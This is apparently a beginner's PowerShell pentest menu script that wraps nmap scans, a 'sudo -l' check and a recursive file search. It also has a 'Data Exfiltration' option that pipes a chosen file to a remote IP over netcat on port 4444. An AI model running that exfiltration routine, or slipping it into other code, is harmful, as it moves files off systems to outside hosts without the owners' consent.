# Basic Pentester Tools Script
# A simple menu-driven interface for basic pentesting tasks

# Function to display the menu options to the user
function Show-Menu {
    Clear-Host
    Write-Host "==========================================="
    Write-Host "      Basic Pentester Tools Menu"
    Write-Host "==========================================="
    Write-Host "1. Reconnaissance"
    Write-Host "2. Enumeration"
    Write-Host "3. Privilege Escalation"
    Write-Host "4. File Searching"
    Write-Host "5. Data Exfiltration"
    Write-Host "6. Exit"
    Write-Host "==========================================="
    Write-Host "Please select an option (1-6):"
}

# Function to perform reconnaissance using nmap
function Perform-Reconnaissance {
    Clear-Host
    Write-Host "Starting Reconnaissance..."
    # Prompt the user to input the target IP address
    $ip = Read-Host "Enter the target IP address for reconnaissance"
    Write-Host "Running basic Nmap scan on $ip..."
    # Run a basic nmap scan (-A for aggressive scan, which includes OS detection, version detection, etc.)
    nmap -A $ip
    Write-Host "Reconnaissance completed."
    Pause
}

# Function to perform service enumeration using nmap
function Perform-Enumeration {
    Clear-Host
    Write-Host "Starting Enumeration..."
    # Prompt the user to input the target IP address or hostname
    $target = Read-Host "Enter target IP address or hostname"
    Write-Host "Running service enumeration on $target..."
    # Use nmap's -sV flag to scan for services and versions on the target
    nmap -sV $target
    Write-Host "Enumeration completed."
    Pause
}

# Function to check for privilege escalation opportunities (using sudo)
function Perform-PrivilegeEscalation {
    Clear-Host
    Write-Host "Starting Privilege Escalation Check..."
    Write-Host "Checking for sudo permissions..."
    # Run 'sudo -l' to list available sudo privileges (this will only work on Unix-like systems)
    sudo -l
    Write-Host "Privilege escalation check completed."
    Pause
}

# Function to search for files in a given directory
function Perform-FileSearching {
    Clear-Host
    Write-Host "Starting File Searching..."
    # Prompt the user for the directory to search
    $dir = Read-Host "Enter directory to search (e.g., C:\ or /etc)"
    # Prompt the user for the type of files to search for (e.g., *.txt, *.conf)
    $fileType = Read-Host "Enter file type to search for (e.g., *.txt, *.conf)"
    Write-Host "Searching for $fileType in $dir..."
    # Use Get-ChildItem to recursively search for files with the specified extension
    Get-ChildItem -Path $dir -Recurse -Filter $fileType
    Write-Host "File search completed."
    Pause
}

# Function to simulate data exfiltration
function Perform-Exfiltration {
    Clear-Host
    Write-Host "Starting Data Exfiltration..."
    # Prompt the user to specify the path of the file to exfiltrate
    $filePath = Read-Host "Enter the path of the file to exfiltrate"
    # Prompt the user for the destination IP address to send the file to
    $destinationIP = Read-Host "Enter the destination IP address"
    Write-Host "Exfiltrating file $filePath to $destinationIP..."
    # Simulate file exfiltration by sending the file via Netcat (nc) to the specified IP address on port 4444
    # This requires the nc tool to be installed and running on the destination IP
    cmd /c "nc $destinationIP 4444 < $filePath"
    Write-Host "Data exfiltration completed."
    Pause
}

# Main program loop to show the menu and handle user input
do {
    # Show the menu to the user
    Show-Menu
    # Prompt the user to select an option
    $choice = Read-Host "Select an option (1-6)"
    
    # Based on the user's input, perform the corresponding action
    if ($choice -eq '1') {
        Perform-Reconnaissance
    }
    elseif ($choice -eq '2') {
        Perform-Enumeration
    }
    elseif ($choice -eq '3') {
        Perform-PrivilegeEscalation
    }
    elseif ($choice -eq '4') {
        Perform-FileSearching
    }
    elseif ($choice -eq '5') {
        Perform-Exfiltration
    }
    elseif ($choice -eq '6') {
        Write-Host "Exiting..."; break
    }
    else {
        Write-Host "Invalid option, please choose a number between 1 and 6."
    }
} while ($choice -ne '6')

